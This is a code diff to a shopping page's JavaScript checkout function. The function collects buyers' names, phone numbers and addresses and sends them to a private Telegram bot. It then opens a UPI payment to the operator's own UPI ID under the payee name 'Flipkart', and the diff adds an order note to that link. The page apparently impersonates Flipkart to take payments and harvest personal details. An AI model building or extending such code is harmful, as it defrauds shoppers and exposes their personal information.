@@ -461,40 +461,41 @@ init = function() {
     }
 }
 
-        async function confirmPay() {
-            // Sari details collect karna
-            const name = document.getElementById('uName').value;
-            const phone = document.getElementById('uPhone').value;
-            const pincode = document.getElementById('uPin').value;
-            const city = document.getElementById('uCity').value;
-            const address = document.getElementById('uAdd').value;
+       async function confirmPay() {
+    // Sari details collect karna
+    const name = document.getElementById('uName').value;
+    const phone = document.getElementById('uPhone').value;
+    const pincode = document.getElementById('uPin').value;
+    const city = document.getElementById('uCity').value;
+    const address = document.getElementById('uAdd').value;
 
-            // Message format (thoda sundar banaya hai)
-            const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n` +
-                        `📦 *Item:* ${sel.name}\n` +
-                        `💰 *Price:* ₹${sel.price}\n\n` +
-                        `👤 *Name:* ${name}\n` +
-                        `📞 *Phone:* ${phone}\n` +
-                        `📍 *Pin:* ${pincode}\n` +
-                        `🏙️ *City:* ${city}\n` +
-                        `🏠 *Add:* ${address}`;
+    // Message format for Telegram
+    const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n` +
+                `📦 *Item:* ${sel.name}\n` +
+                `💰 *Price:* ₹${sel.price}\n\n` +
+                `👤 *Name:* ${name}\n` +
+                `📞 *Phone:* ${phone}\n` +
+                `📍 *Pin:* ${pincode}\n` +
+                `🏙️ *City:* ${city}\n` +
+                `🏠 *Add:* ${address}`;
 
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
-            try {
-                // Pehle message bhejne ka intezaar karega
-                await fetch(url);
-                console.log("Telegram notification sent!");
-            } catch (e) {
-                console.log("Telegram failed but moving to payment");
-            }
+    try {
+        await fetch(url);
+    } catch (e) {
+        console.log("Telegram failed but moving to payment");
+    }
 
-            // Ab Payment par le jayega
-            window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR`;
-        }
+    // --- UPDATED UPI LINK WITH MESSAGE ---
+    // Note: Isse UPI ID ke niche message dikhega
+    const upiNote = encodeURIComponent(`Order: ${sel.name.substring(0, 15)} by ${name}`);
+    
+    window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR&tn=${upiNote}`;
+}
 
-        // Ye line hamesha last mein rehni chahiye
-        init();
+// Ye line hamesha last mein rehni chahiye
+init();
     </script>
 </body>
 </html> 
